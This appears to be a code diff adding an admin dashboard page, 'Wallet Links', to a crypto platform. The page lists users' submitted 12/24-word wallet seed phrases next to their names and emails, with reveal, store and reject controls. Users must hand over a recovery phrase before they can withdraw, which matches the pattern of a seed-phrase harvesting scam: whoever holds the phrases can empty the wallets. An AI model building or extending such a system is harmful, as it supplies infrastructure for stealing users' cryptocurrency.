@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Wallet Links — Admin</title>
+<script>
+  (function(){
+    var t = localStorage.getItem("wsc_theme") || "dark";
+    document.documentElement.setAttribute("data-theme", t);
+  })();
+</script>
+<link rel="stylesheet" href="/css/styles.css">
+<link rel="stylesheet" href="/admin/shared.css">
+<style>
+  /* Page-specific: reveal toggle for the seed phrase column */
+  .wl-phrase {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text-dim);
+    max-width: 320px;
+    word-break: break-word;
+    line-height: 1.5;
+  }
+  .wl-phrase.hidden {
+    filter: blur(6px);
+    user-select: none;
+    cursor: pointer;
+  }
+  .wl-reveal-btn {
+    background: none;
+    border: 1px solid var(--line);
+    color: var(--gold-bright);
+    font-size: 10.5px;
+    font-family: var(--sans);
+    padding: 3px 9px;
+    border-radius: 6px;
+    cursor: pointer;
+    margin-left: 8px;
+    transition: all 0.15s;
+  }
+  .wl-reveal-btn:hover {
+    border-color: var(--gold);
+    background: rgba(59, 130, 246, 0.08);
+  }
+  .wl-actions {
+    display: flex;
+    gap: 6px;
+    flex-wrap: wrap;
+  }
+  .wl-reason-row {
+    display: none;
+    padding: 10px 12px;
+    border-radius: 8px;
+    background: rgba(248, 113, 113, 0.06);
+    border: 1px solid rgba(248, 113, 113, 0.25);
+    margin-top: 10px;
+    gap: 8px;
+    align-items: center;
+    min-width: 260px;
+  }
+  .wl-reason-row.show { display: flex; }
+  .wl-reason-row input {
+    flex: 1;
+    padding: 8px 12px;
+    border-radius: 6px;
+    background: var(--input-bg);
+    border: 1px solid var(--input-border);
+    color: var(--text);
+    font-size: 12.5px;
+    font-family: var(--sans);
+  }
+  .wl-reason-row input:focus {
+    outline: none;
+    border-color: var(--tick-down);
+  }
+</style>
+</head>
+<body>
+
+<div class="auth-bg"></div>
+
+<button class="theme-toggle" id="theme-toggle-btn" aria-label="Toggle theme">
+  <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+  </svg>
+  <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <circle cx="12" cy="12" r="4"/>
+    <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/>
+  </svg>
+</button>
+
+<div class="adm-app" id="adm-app"></div>
+
+<script src="/js/theme.js"></script>
+<script src="/js/api.js"></script>
+<script src="/admin/shared.js"></script>
+<script>
+AdminShell.mount({
+  activeKey: "wallets",
+  title: "Wallet Links",
+  onReady: function (root) {
+    root.innerHTML = `
+      <div class="adm-section" style="margin-top:0;">
+        <div class="adm-section-head">
+          <div>
+            <h2>Wallet links</h2>
+            <p class="desc">
+              Users submit a 12/24-word phrase to link a wallet. Review the shape, then either
+              <strong>store</strong> (approve) or <strong>reject</strong> each submission.
+              Only stored wallets count toward the withdrawal-wallet requirement.
+            </p>
+          </div>
+        </div>
+
+        <div class="adm-dash-grid" style="margin-bottom:20px;grid-template-columns:repeat(4,1fr);">
+          <div class="adm-stat">
+            <div class="adm-stat-head">
+              <div class="adm-stat-label">Pending review</div>
+              <div class="adm-stat-ico amber">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+              </div>
+            </div>
+            <div class="adm-stat-value" id="wl-stat-pending">—</div>
+            <div class="adm-stat-sub">Awaiting decision</div>
+          </div>
+          <div class="adm-stat">
+            <div class="adm-stat-head">
+              <div class="adm-stat-label">Stored</div>
+              <div class="adm-stat-ico green">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
+              </div>
+            </div>
+            <div class="adm-stat-value" id="wl-stat-stored">—</div>
+            <div class="adm-stat-sub">Approved</div>
+          </div>
+          <div class="adm-stat">
+            <div class="adm-stat-head">
+              <div class="adm-stat-label">Rejected</div>
+              <div class="adm-stat-ico rose">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
+              </div>
+            </div>
+            <div class="adm-stat-value" id="wl-stat-rejected">—</div>
+            <div class="adm-stat-sub">Not saved</div>
+          </div>
+          <div class="adm-stat">
+            <div class="adm-stat-head">
+              <div class="adm-stat-label">Total</div>
+              <div class="adm-stat-ico blue">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="6" width="20" height="14" rx="2"/><path d="M2 10h20"/><circle cx="17" cy="14" r="1"/></svg>
+              </div>
+            </div>
+            <div class="adm-stat-value" id="wl-stat-total">—</div>
+            <div class="adm-stat-sub">All submissions</div>
+          </div>
+        </div>
+
+        <div class="adm-card">
+          <div class="adm-field" style="margin-bottom:16px;max-width:360px;">
+            <label for="wl-filter">Filter</label>
+            <select id="wl-filter">
+              <option value="">All statuses</option>
+              <option value="pending_review">Pending review</option>
+              <option value="stored">Stored</option>
+              <option value="rejected">Rejected</option>
+            </select>
+          </div>
+
+          <div id="wl-table-wrap">
+            <div class="empty-state"><span class="loading">Loading submissions</span></div>
+          </div>
+        </div>
+      </div>
+    `;
+
+    document.getElementById("wl-filter").addEventListener("change", renderTable);
+    loadWalletLinks();
+  }
+});
+
+let WL_ROWS = [];
+
+async function loadWalletLinks() {
+  const wrap = document.getElementById("wl-table-wrap");
+  try {
+    WL_ROWS = await AdminShell.api("/admin/wallet-links");
+
+    // Stats
+    const pending  = WL_ROWS.filter(r => r.status === "pending_review").length;
+    const stored   = WL_ROWS.filter(r => r.status === "stored").length;
+    const rejected = WL_ROWS.filter(r => r.status === "rejected").length;
+    setText("wl-stat-pending",  pending);
+    setText("wl-stat-stored",   stored);
+    setText("wl-stat-rejected", rejected);
+    setText("wl-stat-total",    WL_ROWS.length);
+
+    AdminShell.setCount("count-wallets", pending);
+
+    renderTable();
+  } catch (err) {
+    wrap.innerHTML = `<div class="empty-state">Could not load wallet links: ${AdminShell.escapeHtml(err.message)}</div>`;
+  }
+}
+
+function setText(id, n) {
+  const el = document.getElementById(id);
+  if (el) el.textContent = typeof n === "number" ? n.toLocaleString() : "—";
+}
+
+function statusBadge(status) {
+  const cls =
+    status === "stored"   ? "ok" :
+    status === "rejected" ? "bad" :
+    status === "pending_review" ? "warn" : "neutral";
+  const label = (status || "").replace(/_/g, " ");
+  return `<span class="badge ${cls}">${AdminShell.escapeHtml(label)}</span>`;
+}
+
+function renderTable() {
+  const wrap = document.getElementById("wl-table-wrap");
+  const filter = document.getElementById("wl-filter").value;
+
+  const rows = filter ? WL_ROWS.filter(r => r.status === filter) : WL_ROWS;
+
+  if (!rows.length) {
+    wrap.innerHTML = `<div class="empty-state">No submissions${filter ? " in this view" : " yet"}.</div>`;
+    return;
+  }
+
+  const E = AdminShell.escapeHtml;
+
+  const html = rows.map(r => {
+    const phrase = r.address || "—";
+    const phraseShort = phrase.length > 80 ? phrase.slice(0, 80) + "…" : phrase;
+    const canAct = r.status === "pending_review";
+
+    return `
+      <tr data-id="${E(r.id)}">
+        <td>
+          <div style="font-weight:600;">${E(r.user_name || r.user_email || "—")}</div>
+          <div class="muted" style="font-size:11.5px;">${E(r.user_email || "")}</div>
+        </td>
+        <td>${E(r.wallet_id || "—")}</td>
+        <td>${E(r.chain || "—")}</td>
+        <td>
+          <span class="wl-phrase hidden" data-phrase="${E(r.id)}">${E(phraseShort)}</span>
+          <button class="wl-reveal-btn" data-reveal="${E(r.id)}">Reveal</button>
+        </td>
+        <td>${statusBadge(r.status)}</td>
+        <td class="muted" style="font-size:11.5px;">
+          ${r.linked_at ? new Date(r.linked_at).toLocaleString() : "—"}
+        </td>
+        <td>
+          <div class="wl-actions">
+            ${canAct ? `
+              <button class="btn-sm approve" data-store="${E(r.id)}">Store</button>
+              <button class="btn-sm reject"  data-reject="${E(r.id)}">Reject</button>
+            ` : `<span class="muted" style="font-size:11.5px;">—</span>`}
+          </div>
+          <div class="wl-reason-row" data-reason-row="${E(r.id)}">
+            <input type="text" placeholder="Reason for rejection (optional)" data-reason-input="${E(r.id)}">
+            <button class="btn-sm reject" data-confirm-reject="${E(r.id)}">Confirm</button>
+          </div>
+        </td>
+      </tr>
+    `;
+  }).join("");
+
+  wrap.innerHTML = `
+    <table>
+      <thead>
+        <tr>
+          <th>User</th>
+          <th>Wallet</th>
+          <th>Chain</th>
+          <th>Phrase</th>
+          <th>Status</th>
+          <th>Submitted</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody>${html}</tbody>
+    </table>
+  `;
+
+  bindActions();
+}
+
+function bindActions() {
+  // Reveal / hide the phrase
+  document.querySelectorAll("[data-reveal]").forEach(btn => {
+    btn.addEventListener("click", () => {
+      const id = btn.dataset.reveal;
+      const cell = document.querySelector(`[data-phrase="${id}"]`);
+      if (!cell) return;
+      const isHidden = cell.classList.toggle("hidden");
+      btn.textContent = isHidden ? "Reveal" : "Hide";
+    });
+  });
+
+  // Also allow clicking the blurred cell to reveal
+  document.querySelectorAll(".wl-phrase.hidden").forEach(cell => {
+    cell.addEventListener("click", () => {
+      const id = cell.dataset.phrase;
+      const btn = document.querySelector(`[data-reveal="${id}"]`);
+      cell.classList.remove("hidden");
+      if (btn) btn.textContent = "Hide";
+    });
+  });
+
+  // Store (approve)
+  document.querySelectorAll("[data-store]").forEach(btn => {
+    btn.addEventListener("click", async () => {
+      const id = btn.dataset.store;
+      if (!confirm("Store this wallet? The user will be able to use it for withdrawals.")) return;
+      btn.disabled = true;
+      btn.textContent = "…";
+      try {
+        await AdminShell.api(`/admin/wallet-links/${id}/store`, { method: "POST" });
+        loadWalletLinks();
+      } catch (err) {
+        alert("Could not store: " + err.message);
+        btn.disabled = false;
+        btn.textContent = "Store";
+      }
+    });
+  });
+
+  // Reject — reveal inline reason row
+  document.querySelectorAll("[data-reject]").forEach(btn => {
+    btn.addEventListener("click", () => {
+      const id = btn.dataset.reject;
+      const row = document.querySelector(`[data-reason-row="${id}"]`);
+      row.classList.toggle("show");
+      if (row.classList.contains("show")) row.querySelector("input").focus();
+    });
+  });
+
+  // Confirm reject
+  document.querySelectorAll("[data-confirm-reject]").forEach(btn => {
+    btn.addEventListener("click", async () => {
+      const id = btn.dataset.confirmReject;
+      const input = document.querySelector(`[data-reason-input="${id}"]`);
+      const reason = (input.value || "").trim();
+      btn.disabled = true;
+      btn.textContent = "…";
+      try {
+        await AdminShell.api(`/admin/wallet-links/${id}/reject`, {
+          method: "POST",
+          body: JSON.stringify({ reason: reason || null }),
+        });
+        loadWalletLinks();
+      } catch (err) {
+        alert("Could not reject: " + err.message);
+        btn.disabled = false;
+        btn.textContent = "Confirm";
+      }
+    });
+  });
+}
+</script>
+</body>
+</html>
